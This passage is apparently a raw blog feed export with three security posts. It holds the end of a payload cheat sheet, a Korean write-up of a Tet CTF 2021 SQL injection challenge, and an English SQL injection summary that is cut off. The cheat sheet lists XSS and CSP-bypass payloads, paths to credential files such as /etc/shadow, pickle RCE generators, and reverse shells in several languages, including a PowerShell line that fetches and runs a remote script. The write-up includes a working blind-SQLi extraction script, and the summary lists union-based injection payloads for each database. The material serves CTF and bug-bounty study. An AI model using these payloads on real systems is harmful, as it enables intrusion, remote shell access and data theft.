src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title=" Path Traversal"></a><span style="color:#21C587"></span> Path Traversal<br></h2><p><span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;exe</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021년 1월 1일 오전 9시부터 Tet CTF라는 대회가 열렸습니다. 그래서 이번 대회에서 출제된 SQL Injectino 문제의 풀이를 작성해보겠습니다. 사실 대회는 2일동안 진행했는데 1시간도 안 했음,, 게임 한다고,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 <code>flag</code>를 뽑아야겠다 생각이 들었습니다.</strong><br><br></p><p><strong>하지만 <code>culumn</code>이라는 키워드가 필터링이 걸려 있어 <code>flag</code>가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 <code>information_schema.columns</code>라는 메타 테이블에서 <code>column_name</code>을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>그러다가 N1 CTF에서 <code>exp()</code> 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 <code>exp()</code>함수를 이용해서 <code>Overflow</code>를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 <code>exp()</code> 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 <code>exp()</code> 함수 대신 <code>pow()</code> 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, <code>t_fl4g_v3lue_su</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Summary</title>
      <link href="2021/01/02/2021-01-02-SQL-Injection-Summary/"/>
      <url>2021/01/02/2021-01-02-SQL-Injection-Summary/</url>
      
        <content type="html"><![CDATA[<p>Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let’s write the attack techniques and bypass techniques for each trick.<br></p><hr><h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#35;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br><br>   <span style="color:#3E386D">→</span> &#59;&#37;00<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;<br><br><span style="color:#3E386D">→</span> &#8211;&#8211;&#43;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br></p></blockquote><hr><h2 id="Version-Check"><a href="#Version-Check" class="headerlink" title="Version Check"></a>Version Check</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> @@version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> select * from v$version<br><br><span style="color:#3E386D">→</span> select version from product_component_version<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> sqlite_version()<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> version()<br></p></blockquote><hr><h2 id="Union-Based-SQL-Injection"><a href="#Union-Based-SQL-Injection" class="headerlink" title="Union Based SQL Injection"></a>Union Based SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(table_name), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(column_name), null, null, null from information_schema.columns<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select db_name(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null, null, null from  (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 4 table_name from information_schema.tables order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null from (select top 1 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 2 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 3 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 4 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br><br><span style="color:#3E386D">→</span> &#39; union select &#60;column_name&#62;, null, null, null from &#60;table_name&#62;<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select string_agg(db_name(),&#39;,&#39;), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name,&#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39;union select string_agg(column_name,&#39;,&#39;), null, null, null from information_schema.columns where table_name=’&#60;table_name&#62;’<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;,&#39;,&#39;), null, null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null from dual<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null from dual<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select LISTAGG(table_name,&#39;,&#39;) WITHIN GROUP(ORDER BY table_name), null<br>FROM user_tables<br><br><span style="color:#3E386D">→</span> &#39; union select null, LISTAGG(column_name,&#39;,&#39;) WITHIN GROUP(ORDER BY column_name) from cols<br><br><span style="color:#3E386D">→</span> &#39; union select LISTAGG(&#60;column_name&#62;,&#39;,&#39;) WITHIN GROUP(ORDER BY &#60;column_name&#62;) AS result, null<br>FROM &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLITE</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select sqlite_version(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(sql), group_concat(name), null, null from sqlite_master<br><br><span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), group_concat(&#60;column_name&#62;), null, null from &#60;table_name&#62;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39; union select 